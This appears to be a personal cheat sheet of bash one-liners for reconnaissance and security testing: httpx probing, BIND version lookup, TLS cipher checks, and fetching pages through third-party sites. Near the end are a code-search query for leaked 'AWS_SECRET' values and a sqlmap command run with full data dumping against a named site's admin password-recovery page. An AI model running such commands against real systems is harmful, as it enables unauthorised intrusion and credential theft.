# This is a collection of mostly bash one lines or combinations of piped cmds not worth making a script of but worthy anyway
################### 

       ░▒▓██████▓▒░  ░▒▓███████▓▒░  ░▒▓████████▓▒░       ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓███████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░   ░▒▓███████▓▒░ 
      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░              ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        
      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░              ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        
      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓██████▓▒░         ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓██████▓▒░   ░▒▓███████▓▒░   ░▒▓██████▓▒░  
      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░              ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ 
      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░              ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ 
       ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░       ░▒▓████████▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓███████▓▒░  
                                                                                                                                            
                                                                                                                                
created: sometime in 2022
last update: 02/19/2024
updated by substance

Assumed or recommended prereq's:
--------------------------------
It is strongly recommended to apt-get install or brew install or yum install the following to have all the examples here work:
a) hping3
b) arp-scan/arp-fingerprint
c) jq (this is also called json_pp)
d) arp (Its in package called inetutils if you cant find it  thats a starting point)
e) iptables / ipset
f) nc - netcat  / socat2 (Socket Cat like netcat for sockets / SSL)
g) All the core utils that come with a stock Ubuntu / RH system this includes
  -  tr, troff, xargs, sed, awk, grep, egrep, echo, export, ls, more, less, for

We will be doing a *ton* of "xargs" - if you dont know this command before you start down this git repo:
a)  man xargs
b)  man jq
c)  The BUILTIN's (for, while) - 
bash$ man while
BUILTIN(1)                                                     General Commands Manual                                                     BUILTIN(1)

NAME
     builtin, !, %, ., :, @, [, {, }, alias, alloc, bg, bind, bindkey, break, breaksw, builtins, case, cd, chdir, command,
     complete, continue, default, dirs, do, done, echo, echotc, elif, else, end, endif, endsw, esac, eval, exec, exit,
     export, false, fc, fg, filetest, fi, for, foreach, getopts, glob, goto, hash, hashstat, history, hup, if, jobid, jobs,
     kill, limit, local, log, login, logout, ls-F, nice, nohup, notify, onintr, popd, printenv, printf, pushd, pwd, read, 
     readonly, rehash, repeat, return, sched, set, setenv, settc, setty, setvar, shift, source, stop, suspend, switch, 
     telltc, test, then, time, times, trap, true, type, ulimit, umask, unalias, uncomplete, unhash, unlimit, unset, 
     unsetenv, until, wait, where, which, while – shell built-in commands

-

How to maintain ANSI while using jq | more:
cat file.json | jq -C . | more -R


Dope 9x prompt:
export PS1='\e[1;30m[\e[1;37m9x\e[1;30m]\e[1;37m::\e[0;37m\][\[\e[1;30m\]\@\[\e[0;37m\]]\e[0;35m:\e[0;37m[\[\e[0;37m\
]\e[1;37m\w\[\e[0;37;40m\]]\n\[\e[0;37m\][\[\e[1;36m\]\u\[\e[1;30m\]@\[\e[1;36m\]\h\[\e[0;37m\]]\[\e[0m\]\$ '

Project Discovery Tools:
-----------------------
httpx - (git clone it)
Try it with these options:
httpx -l $1 -sc -cl -ct -location -jarm -td -lc -wc -title -server  -method -websocket -ip  -asn -cdn -probe -mc 200,201,202,203,204,301,302,303 -fc 403,404 -t 10 -pa -tls-probe -csp-probe -tls-grab -pipeline -http2 -vhost -tls-grab


In order to get remote BIND version (most of the time)
bash$ dig version.bind CHAOS TXT @ns1.cloudflare.com
result: version.bind.		60	CH	TXT	"2023.11.2"



Extract all http/https links - sed -nE 's#.*(https?://[^[:space:]]+).*#\1#p' 

curl -sLk 'https://searchcode.com/api/codesearch_I/?q=AWS_SECRET&lan=230&lan=22'| jq
Prox() (curl 'https://www.codebeautify.com/URLService'   -H 'authority: www.codebeautify.com'   -H 'accept: */*'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: no-cache'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'origin: https://codebeautify.org'   -H 'pragma: no-cache'   -H 'referer: https://codebeautify.org/'   -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"'   -H 'sec-ch-ua-mobile: ?0'   -H 'sec-ch-ua-platform: "Windows"'   -H 'sec-fetch-dest: empty'   -H 'sec-fetch-mode: cors'   -H 'sec-fetch-site: cross-site'   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'   --data-raw "path=https%3A%2F%2F$1" )

To cleanly display urlencoded data (such as output from alert(doc.cookie));:
urldecode() { echo -e "$(sed -e 's/+/ /g' -e 's/%\(..\)/\\x\1/g' -e 's/\({\)/\n\1\n/g' -e 's/\(}\)/\n\1\n/g' -e 's/=/ = /g' -e 's/&/\n/g' <<< "${1:-$(cat)}")"; }
  output should look like:
  _clsk = 1i8lkgm|170910688|3|1|o.clarity.ms/collect
  _mkto_trk = id:168-NAU-732
  token:_mch-hackerone.com-17<snip>14-12823
 _ga = GA1.2.96274045.1700899
 _gid = GA1.2.10073799.1709621274


webExif() ( curl -sLk "https://exifinfo.org/url?url=https%3A%2F%2F$1"   -H 'authority: exifinfo.org'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'referer: https://exifinfo.org/detail/Y63C9Nj87SLMphgbDWvcjg'   -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"'   -H 'sec-ch-ua-platform: "Windows"'   -H 'sec-fetch-dest: document'   -H 'sec-fetch-mode: navigate'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-user: ?1'   -H 'upgrade-insecure-requests: 1'   -H 'user-agent: Mozilla' | html2text | tee webExif-$1.txt)
dumpSrc() ( curl -s 'https://www.view-page-source.com/' -X POST -H 'User-Agent: Mozilla/5.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: https://www.view-page-source.com/' -H 'Origin: https://www.view-page-source.com' -H 'DNT: 1' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Connection: keep-alive' -H 'Cookie: _ga_B3W86S4WQ2=GS1.1.1680622601.1.0.1680622601.0.0.0; _ga=GA1.11214855363.1680622601; cookieConsentAccepted=YES' --data-raw "reference_id=1&vps_token=SeklugwIkuKucy.dryKY&uri=https%3A%2F%2F$1&stylize=stylize" )

alias urls=" sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^<]*\)\(.*\)/\1/g'"

d=$(date +%s%N)

alias rmcr=" awk 'NF'" # Pipe this to remove any blank lines
Example:
cat /etc/*.conf

Before:
#   this part, either.
#   If you don't want the automatic advertisement, (uncomment and) configure
#   this part by hand, and then invoke rtadvd with the -s option.
 
#ef0:\
#	:addr="3ffe:501:ffff:1000::":prefixlen#64:
# Note that flat file logs are now configured in /etc/asl.conf

install.*						@127.0.0.1:32376

After: cat /etc/*.conf| rmcr 
#   this part, either.
#   If you don't want the automatic advertisement, (uncomment and) configure
#   this part by hand, and then invoke rtadvd with the -s option.
#ef0:\
#	:addr="3ffe:501:ffff:1000::":prefixlen#64:
# Note that flat file logs are now configured in /etc/asl.conf
install.*						@127.0.0.1:32376




# Identify what SSL TLS version is running on the remote hostname
echo "" | openssl s_client -connect $1:443 2>&1 | grep Cipher | awk '{print $NF}' | grep -Ev "($(openssl ciphers -v 'ALL:ALL' | grep -Ei "(gcm|pfs)" | grep -Ei "(ec|dhe)" | grep 256 | awk '{print "TLS_"$1}' | tr '-' '_' | tr '\n' '|' | head -c -1))"
 



        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.9.3#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
               Running SQLMap - Various options I typically use:
sqlmap --url "https://tiatrue.com/admin.php?target=recover_password&valid=0" --dbms=mysql --random-agent --level 3 -a
Note: The goal is to find a dynamic parameter or multiple and run sqlmap on that.  As seen above.
